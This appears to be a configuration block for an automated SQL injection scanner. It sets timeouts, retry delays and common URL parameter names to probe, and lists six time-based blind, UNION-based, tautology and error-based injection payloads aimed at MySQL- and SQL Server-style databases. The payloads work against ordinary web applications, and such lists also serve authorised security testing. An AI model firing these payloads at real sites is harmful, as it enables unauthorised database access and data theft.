SCAN_CONFIG = {
    "TIMEOUT": 10,
    "MAX_ATTEMPTS": 3,
    "RETRY_DELAY": 1.5,
    "DELAY_THRESHOLD": 1.5,  # Increased sensitivity
    "DEFAULT_PARAMS": ["id", "user", "q", "search", "artist"],
    "BLIND_PAYLOADS": [
        "' OR SLEEP(1.5)#",
        "' UNION SELECT null,@@version,null-- ",
        "' AND (SELECT 1 FROM (SELECT SLEEP(1.5))a)--",
        "' OR 1=1 LIMIT 1 -- ",
        "' AND GTID_SUBSET(@@version, 0)--",
        "' AND 1=CONVERT(int,@@version)--"
    ]
}